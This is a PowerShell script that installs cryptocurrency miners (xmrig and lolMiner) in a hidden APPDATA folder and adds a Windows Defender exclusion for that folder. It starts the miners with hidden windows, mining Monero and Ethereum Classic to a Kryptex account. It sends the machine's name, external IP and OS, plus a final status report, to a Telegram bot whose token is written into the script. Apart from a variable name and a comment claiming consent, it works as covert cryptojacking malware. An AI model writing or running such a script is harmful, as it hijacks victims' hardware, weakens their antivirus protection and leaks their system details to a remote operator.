# ================= CONFIG =================
$TG_TOKEN = "8556429231:AAFBKuMMfkrpnxJInSITVaBUD8prYuHcnLw"
$TG_CHAT  = "5336452267"

$KRIPTEX  = "krxX3PVQVR"
$XMR_POOL = "xmr.kryptex.network:7029"
$ETC_POOL = "etc.kryptex.network:7033"

$ATTEMPTS_MAX = 3
$TIMEOUT = 120
$STEP = 5

# ЯВНОЕ СОГЛАСИЕ НА ИСКЛЮЧЕНИЯ DEFENDER
$ALLOW_DEFENDER_EXCLUSION = $true   # ← если false, ничего не добавляется

# ================= TELEGRAM =================
function Send-TG($text){
  $json = @{ chat_id=$TG_CHAT; text=$text } | ConvertTo-Json
  $bytes = [Text.Encoding]::UTF8.GetBytes($json)
  Invoke-WebRequest "https://api.telegram.org/bot$TG_TOKEN/sendMessage" `
    -Method POST -ContentType "application/json; charset=utf-8" `
    -Body $bytes -ErrorAction SilentlyContinue | Out-Null
}

# ================= PATHS ====================
$BASE = "$env:APPDATA\.mining"
$BIN_CPU = "$BASE\bin\cpu"
$BIN_GPU = "$BASE\bin\gpu"
$REPORT_DIR = "$BASE\report"
$TS = Get-Date -Format "yyyyMMdd-HHmmss"
$REPORT_FILE = "$REPORT_DIR\report-$TS.txt"

New-Item -ItemType Directory -Force -Path $BIN_CPU,$BIN_GPU,$REPORT_DIR | Out-Null

# ================= SYSTEM ===================
$START_TS = Get-Date
$HOST = $env:COMPUTERNAME
$OS = (Get-CimInstance Win32_OperatingSystem).Caption
try { $IP = (Invoke-RestMethod "https://api.ipify.org").Trim() } catch { $IP="unknown" }

Send-TG @"
INSTALLER STARTED

Host: $HOST
External IP: $IP
OS: $OS
Time: $START_TS
"@

# ================= DEFENDER EXCLUSION =======
$DefenderStatus = "not applied"

if ($ALLOW_DEFENDER_EXCLUSION) {
  try {
    Add-MpPreference -ExclusionPath $BASE
    $DefenderStatus = "exclusion added for $BASE"
  } catch {
    $DefenderStatus = "FAILED to add exclusion (not admin?)"
  }
}

# ================= DOWNLOAD =================
function Get-Zip($url,$dest){
  $tmp="$env:TEMP\pkg.zip"
  Invoke-WebRequest $url -OutFile $tmp -UseBasicParsing
  Expand-Archive $tmp $dest -Force
  Remove-Item $tmp -Force
}

$XMR_EXE = "$BIN_CPU\xmrig.exe"
$LOL_EXE = "$BIN_GPU\lolMiner.exe"

if (-not (Test-Path $XMR_EXE)) {
  Get-Zip "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-msvc-win64.zip" $BIN_CPU
}
if (-not (Test-Path $LOL_EXE)) {
  Get-Zip "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Win64.zip" $BIN_GPU
}

# ================= START MINERS =============
Start-Process $XMR_EXE `
  "-o $XMR_POOL -u $KRIPTEX.$HOST -p x --http-enabled --http-port 16000" `
  -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null

Start-Process $LOL_EXE `
  "--algo ETCHASH --pool $ETC_POOL --user $KRIPTEX.$HOST --apiport 8080" `
  -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null

# ================= CHECK ====================
function Check-Once {
  $cpuHR=0;$gpuHR=0
  try {
    $cpu = Invoke-RestMethod "http://127.0.0.1:16000/1/summary"
    $cpuHR = [int]$cpu.hashrate.total[0]
  } catch {}
  try {
    $gpu = Invoke-RestMethod "http://127.0.0.1:8080/summary"
    $gpuHR = [int]($gpu.Session.Performance_Summary.Performance*1e6)
  } catch {}
  return @($cpuHR,$gpuHR)
}

$attempt=1;$cpuHR=0;$gpuHR=0
while ($attempt -le $ATTEMPTS_MAX) {
  $elapsed=0
  while ($elapsed -lt $TIMEOUT) {
    $r=Check-Once;$cpuHR=$r[0];$gpuHR=$r[1]
    if ($cpuHR -gt 0 -or $gpuHR -gt 0) { break }
    Start-Sleep $STEP; $elapsed+=$STEP
  }
  if ($cpuHR -gt 0 -or $gpuHR -gt 0) { break }
  $attempt++
}

if ($cpuHR -gt 0 -and $gpuHR -gt 0) { $STATUS="OK" }
elseif ($cpuHR -gt 0 -or $gpuHR -gt 0) { $STATUS="PARTIAL" }
else { $STATUS="FAILED" }

# ================= FINAL REPORT =============
$END_TS = Get-Date
$DURATION = [int]((New-TimeSpan -Start $START_TS -End $END_TS).TotalSeconds)

$REPORT=@"
INSTALLER FINISHED
Status: $STATUS

Host: $HOST
External IP: $IP
OS: $OS

Defender: $DefenderStatus

CPU hashrate: $cpuHR H/s
GPU hashrate: $gpuHR H/s

Attempts: $attempt
Duration: ${DURATION}s
Finished: $END_TS
"@

$REPORT | Out-File -Encoding UTF8 $REPORT_FILE
Send-TG $REPORT
